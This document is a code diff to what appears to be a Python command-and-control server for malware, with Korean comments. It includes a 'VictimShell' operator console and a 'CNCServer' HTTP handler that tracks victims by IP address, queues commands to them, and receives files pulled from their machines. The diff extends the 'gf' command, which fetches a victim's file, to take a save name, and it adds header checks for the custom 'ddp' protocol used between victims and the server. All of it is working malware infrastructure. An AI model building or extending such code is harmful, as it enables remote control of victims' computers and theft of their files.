@@ -7,6 +7,7 @@ from logManager import Logger
 
 import threading
 import cmd
+import os
 
 class BaseShell(cmd.Cmd):
     '''base'''
@@ -97,9 +98,25 @@ class VictimShell(BaseShell):
         pass
 
     def do_gf(self, arg):
-        '''get victim's file\nusage : gf [file path & name]'''
+        '''get victim's file\nusage : gf [file path & name] or gf [victim file path & name] [save name]'''
         global victim_table
-        victim_table[self.targetIP]['command'].append('[gf {}]'.format(arg))
+        
+        parsed_arg = arg.split(' ')
+        if len(parsed_arg) == 1:
+            if os.path.isfile(FILE_PATH + parsed_arg[0]):
+                print('{} is already exit in FILE_PATH'.format(parsed_arg[0]))
+                return
+        elif len(parsed_arg) == 2:
+            if os.path.isfile(FILE_PATH + parsed_arg[1]):
+                print('{} is already exit in FILE_PATH'.format(parsed_arg[1]))
+                return
+        else:
+            return self.default('gf ' + arg)
+
+
+        # victim_table[self.targetIP]['command'].append('[gf {}]'.format(arg))
+        
+
 
     def do_sf(self, arg):
         '''미구현'''
@@ -236,12 +253,22 @@ class CNCServer(BaseHTTPRequestHandler):
         data_string = self.rfile.read(int(self.headers['Content-Length']))
         victim_ip = self.client_address[0]
 
+        if len(data_string) < 10:
+            self._response_ddp_error('invalid ddp data')
+            return
+
         # body 파싱 후 로깅
         parsed_data = self._parse_ddp(data_string)
-        self._logging_parsed_data(victim_ip, parsed_data)
-        
-        if not parsed_data:
+
+        # data 유효성 검증
+        if not parsed_data or parsed_data['head'] != '0xdd':
+            self._response_ddp_error('invalid ddp data')
             return
+
+        # ftp 응답의 경우 로깅 X
+        if parsed_data['type'] != 'FTP_RESPONSE':
+            self._logging_parsed_data(victim_ip, parsed_data)
+        
 
         # victim_table에 ip가 존재하지 않다면 추가 작업
         if victim_ip not in victim_table:
@@ -286,7 +313,9 @@ class CNCServer(BaseHTTPRequestHandler):
                     return
                 # gf 명령어 처리
                 elif data.startswith('[gf'):
-                    file_name = data.split(' ')[1][:-1]
+                    file_name = data.split(' ')
+                    file_name = file_name[len(file_name)-1][:-1]
+
                     self._response_ftp_request(file_name, victim_ip, file_name)
                     return
             # shell 명령어 처리
